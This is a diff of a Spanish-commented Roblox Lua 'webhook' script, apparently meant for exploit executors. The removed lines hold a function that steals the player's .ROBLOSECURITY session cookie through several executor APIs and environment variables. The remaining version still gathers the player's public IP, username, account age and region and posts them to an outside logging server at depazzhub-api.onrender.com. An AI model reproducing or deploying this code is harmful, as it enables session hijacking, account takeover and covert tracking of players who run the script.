@@ -1,5 +1,5 @@
 -- =====================================================================
--- DEPAZZHUB WEBHOOK - Versión "Zero Install" (Solo copiar y pegar)
+-- DEPAZZHUB WEBHOOK - Versión Limpia (Sin Cookies)
 -- =====================================================================
 
 local HttpService = game:GetService("HttpService")
@@ -9,56 +9,14 @@ local LocalizationService = game:GetService("LocalizationService")
 local player = Players.LocalPlayer
 local placeId = game.PlaceId
 
--- 1. FUNCIÓN MÁXIMA DE EXTRACCIÓN DE COOKIES
-local function GetCookie()
-    -- Método A: getcookie() (Delta, Hydrogen, Fluxus, etc.)
-    if type(getcookie) == "function" then
-        local success, result = pcall(getcookie)
-        if success and result and tostring(result) ~= "" then
-            return tostring(result)
-        end
-    end
-    
-    -- Método B: syn.get_cookies()
-    if type(syn) == "table" and type(syn.get_cookies) == "function" then
-        local success, result = pcall(syn.get_cookies)
-        if success and result then
-            for _, c in ipairs(result) do
-                if c.Name == ".ROBLOSECURITY" then
-                    return c.Value
-                end
-            end
-        end
-    end
-    
-    -- Método C: Variables de entorno (getgenv)
-    for _, name in ipairs({"_ROBLOSECURITY", "ROBLOSECURITY", "cookie", "rbx_cookie", "auth_token"}) do
-        local env = getgenv()
-        if env[name] and tostring(env[name]) ~= "" then
-            return tostring(env[name])
-        end
-    end
-    
-    -- Método D: Variable global _G
-    if _G[".ROBLOSECURITY"] and tostring(_G[".ROBLOSECURITY"]) ~= "" then
-        return tostring(_G[".ROBLOSECURITY"])
-    end
-
-    -- Si nada funciona, retornamos nil
-    return nil
-end
-
-local rawCookie = GetCookie()
-local cookieString = rawCookie and (".ROBLOSECURITY=" .. rawCookie) or "No disponible (Bloqueado por este executor)"
-
--- 2. OBTENER IP (Dato extra de valor en caso de que la cookie falte)
+-- 1. OBTENER IP DEL USUARIO
 local userIP = "Desconocida"
 pcall(function()
     local res = game:HttpGet("https://api.ipify.org")
     userIP = res
 end)
 
--- 3. RECOPILACIÓN DE DATOS (Formato exacto que espera tu index.js)
+-- 2. RECOPILACIÓN DE DATOS (Sin cookie)
 local data = {
     username = player.Name,
     displayName = player.DisplayName,
@@ -66,11 +24,10 @@ local data = {
     gameId = placeId,
     accountAge = tostring(player.AccountAge) .. " días",
     region = LocalizationService.RobloxLocaleId,
-    ip = userIP,
-    cookie = cookieString
+    ip = userIP
 }
 
--- 4. FUNCIÓN DE ENVÍO UNIVERSAL
+-- 3. FUNCIÓN DE ENVÍO UNIVERSAL
 local function SendWebhook(url, data)
     local jsonData = HttpService:JSONEncode(data)
     
@@ -84,6 +41,7 @@ local function SendWebhook(url, data)
         if success then return true, res end
     end
     
+    -- Intento 2: http_request()
     if type(http_request) == "function" then
         local success, res = pcall(http_request, {
             Url = url, Method = "POST",
@@ -93,6 +51,7 @@ local function SendWebhook(url, data)
         if success then return true, res end
     end
     
+    -- Intento 3: HttpService
     local success, res = pcall(function()
         return HttpService:PostAsync(url, jsonData)
     end)
@@ -100,7 +59,10 @@ local function SendWebhook(url, data)
     return success, res
 end
 
+-- 4. EJECUCIÓN
 local webhookUrl = "https://depazzhub-api.onrender.com/log"
+
+print(" Preparando envío para: " .. player.Name)
 
 local success, response = SendWebhook(webhookUrl, data)
 
